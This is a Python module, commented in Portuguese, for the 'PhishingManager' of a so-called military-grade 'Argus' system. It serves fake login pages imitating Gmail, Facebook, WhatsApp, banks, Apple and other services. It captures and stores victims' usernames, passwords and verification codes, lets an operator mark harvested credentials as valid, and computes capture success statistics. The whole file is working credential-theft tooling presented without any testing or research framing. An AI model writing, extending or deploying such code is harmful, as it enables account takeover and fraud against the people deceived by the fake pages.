"""
Phishing Manager - Sistema de gerenciamento de campanhas de phishing
Sistema Argus - Nível Militar
"""

import os
import json
import logging
from datetime import datetime
from typing import Dict, List, Optional
from flask import render_template_string

from database.backend.models import db, Device

logger = logging.getLogger(__name__)

class PhishingManager:
    """
    Gerenciador de campanhas de phishing e captura de credenciais
    """
    
    def __init__(self, app=None):
        self.app = app
        self.templates_dir = os.path.join(os.path.dirname(__file__), 'templates')
        
        if app:
            self.init_app(app)
    
    def init_app(self, app):
        """Inicializa com Flask app"""
        self.app = app
    
    def get_available_templates(self) -> List[Dict]:
        """
        Retorna lista de templates disponíveis
        """
        templates = []
        
        if os.path.exists(self.templates_dir):
            for filename in os.listdir(self.templates_dir):
                if filename.endswith('.html'):
                    platform = filename.replace('.html', '')
                    templates.append({
                        'platform': platform,
                        'filename': filename,
                        'path': os.path.join(self.templates_dir, filename),
                        'display_name': self._get_display_name(platform)
                    })
        
        return templates
    
    def _get_display_name(self, platform: str) -> str:
        """Retorna nome amigável da plataforma"""
        names = {
            'gmail': 'Gmail / Google',
            'facebook': 'Facebook',
            'instagram': 'Instagram',
            'whatsapp': 'WhatsApp Web',
            'banco': 'Banco Genérico',
            'microsoft': 'Microsoft / Outlook',
            'apple': 'Apple ID',
            'twitter': 'Twitter / X',
            'linkedin': 'LinkedIn'
        }
        return names.get(platform, platform.title())
    
    def get_template_content(self, platform: str) -> Optional[str]:
        """
        Retorna o conteúdo HTML de um template
        """
        try:
            template_path = os.path.join(self.templates_dir, f"{platform}.html")
            
            if os.path.exists(template_path):
                with open(template_path, 'r', encoding='utf-8') as f:
                    return f.read()
            
            logger.warning(f"Template não encontrado: {platform}")
            return None
            
        except Exception as e:
            logger.error(f"Erro ao carregar template {platform}: {e}")
            return None
    
    def serve_phishing_page(self, platform: str, device_id: Optional[str] = None) -> Optional[str]:
        """
        Serve página de phishing para um dispositivo
        Pode customizar a página com dados do dispositivo
        """
        try:
            content = self.get_template_content(platform)
            
            if not content:
                return None
            
            # Se há device_id, pode customizar o template
            if device_id:
                device = Device.query.filter_by(device_id=device_id).first()
                if device:
                    # Pode injetar dados personalizados aqui
                    # Ex: nome do usuário, localização, etc.
                    pass
            
            return content
            
        except Exception as e:
            logger.error(f"Erro ao servir página de phishing: {e}")
            return None
    
    def capture_credentials(self, device_id: str, platform: str, credentials: Dict) -> Dict:
        """
        Captura e armazena credenciais de phishing
        """
        try:
            from database.backend.models_military import PhishingCredential
            
            # Criar registro de credencial
            credential = PhishingCredential(
                device_id=self._get_device_db_id(device_id),
                platform=platform,
                username=credentials.get('email') or credentials.get('username') or credentials.get('phone'),
                password=credentials.get('password'),
                additional_data=json.dumps({
                    'verification_code': credentials.get('verification_code'),
                    'user_agent': credentials.get('user_agent'),
                    'step': credentials.get('step'),
                    'timestamp': credentials.get('timestamp')
                }),
                ip_address=credentials.get('ip_address'),
                user_agent=credentials.get('user_agent'),
                is_valid=None,  # Será validado posteriormente
                captured_at=datetime.utcnow()
            )
            
            db.session.add(credential)
            db.session.commit()
            
            logger.info(f"Credencial capturada: {platform} - Device {device_id}")
            
            # Registrar métrica
            self._record_phishing_metric(platform, 'capture', device_id)
            
            return {
                'status': 'success',
                'credential_id': credential.credential_id,
                'platform': platform,
                'captured_at': credential.captured_at.isoformat()
            }
            
        except Exception as e:
            db.session.rollback()
            logger.error(f"Erro ao capturar credencial: {e}")
            return {
                'status': 'error',
                'message': str(e)
            }
    
    def _get_device_db_id(self, device_id: str) -> Optional[int]:
        """Obtém ID do banco de dados a partir do device_id"""
        device = Device.query.filter_by(device_id=device_id).first()
        return device.id if device else None
    
    def _record_phishing_metric(self, platform: str, metric_type: str, device_id: str):
        """Registra métrica de phishing"""
        try:
            from database.backend.models_military import Analytics
            
            metric = Analytics(
                metric_type=f'phishing_{metric_type}',
                metric_category='phishing',
                metric_value=1.0,
                metric_unit='count',
                device_id=self._get_device_db_id(device_id),
                tags={'platform': platform}
            )
            
            db.session.add(metric)
            db.session.commit()
            
        except Exception as e:
            logger.error(f"Erro ao registrar métrica de phishing: {e}")
    
    def get_captured_credentials(self, platform: Optional[str] = None, 
                                 device_id: Optional[str] = None,
                                 only_valid: bool = False) -> List[Dict]:
        """
        Retorna credenciais capturadas
        """
        try:
            from database.backend.models_military import PhishingCredential
            
            query = PhishingCredential.query
            
            if platform:
                query = query.filter_by(platform=platform)
            
            if device_id:
                db_id = self._get_device_db_id(device_id)
                if db_id:
                    query = query.filter_by(device_id=db_id)
            
            if only_valid:
                query = query.filter_by(is_valid=True)
            
            credentials = query.order_by(PhishingCredential.captured_at.desc()).all()
            
            return [cred.to_dict() for cred in credentials]
            
        except Exception as e:
            logger.error(f"Erro ao buscar credenciais: {e}")
            return []
    
    def validate_credential(self, credential_id: str, is_valid: bool, notes: str = None) -> bool:
        """
        Marca uma credencial como válida ou inválida
        """
        try:
            from database.backend.models_military import PhishingCredential
            
            credential = PhishingCredential.query.filter_by(credential_id=credential_id).first()
            
            if not credential:
                return False
            
            credential.is_valid = is_valid
            credential.validated_at = datetime.utcnow()
            
            if notes:
                credential.notes = notes
            
            db.session.commit()
            
            logger.info(f"Credencial {credential_id} marcada como {'válida' if is_valid else 'inválida'}")
            return True
            
        except Exception as e:
            db.session.rollback()
            logger.error(f"Erro ao validar credencial: {e}")
            return False
    
    def get_phishing_statistics(self) -> Dict:
        """
        Retorna estatísticas de phishing
        """
        try:
            from database.backend.models_military import PhishingCredential
            
            total_captures = PhishingCredential.query.count()
            
            valid_captures = PhishingCredential.query.filter_by(is_valid=True).count()
            invalid_captures = PhishingCredential.query.filter_by(is_valid=False).count()
            unvalidated_captures = PhishingCredential.query.filter_by(is_valid=None).count()
            
            # Estatísticas por plataforma
            platforms = {}
            for platform in ['gmail', 'facebook', 'instagram', 'whatsapp', 'banco']:
                count = PhishingCredential.query.filter_by(platform=platform).count()
                if count > 0:
                    platforms[platform] = count
            
            # Últimas 24 horas
            from datetime import timedelta
            last_24h = datetime.utcnow() - timedelta(hours=24)
            recent_captures = PhishingCredential.query.filter(
                PhishingCredential.captured_at >= last_24h
            ).count()
            
            return {
                'total_captures': total_captures,
                'valid_captures': valid_captures,
                'invalid_captures': invalid_captures,
                'unvalidated_captures': unvalidated_captures,
                'platforms': platforms,
                'recent_captures_24h': recent_captures,
                'success_rate': (valid_captures / total_captures * 100) if total_captures > 0 else 0
            }
            
        except Exception as e:
            logger.error(f"Erro ao gerar estatísticas de phishing: {e}")
            return {}
    
    def create_custom_template(self, name: str, platform: str, html_content: str) -> bool:
        """
        Cria um template customizado de phishing
        """
        try:
            template_path = os.path.join(self.templates_dir, f"{platform}_custom.html")
            
            with open(template_path, 'w', encoding='utf-8') as f:
                f.write(html_content)
            
            logger.info(f"Template customizado criado: {platform}_custom.html")
            return True
            
        except Exception as e:
            logger.error(f"Erro ao criar template customizado: {e}")
            return False
    
    def delete_template(self, platform: str) -> bool:
        """
        Deleta um template (apenas customizados)
        """
        try:
            # Apenas permitir deletar templates customizados
            if '_custom' not in platform:
                logger.warning(f"Tentativa de deletar template padrão: {platform}")
                return False
            
            template_path = os.path.join(self.templates_dir, f"{platform}.html")
            
            if os.path.exists(template_path):
                os.remove(template_path)
                logger.info(f"Template deletado: {platform}.html")
                return True
            
            return False
            
        except Exception as e:
            logger.error(f"Erro ao deletar template: {e}")
            return False

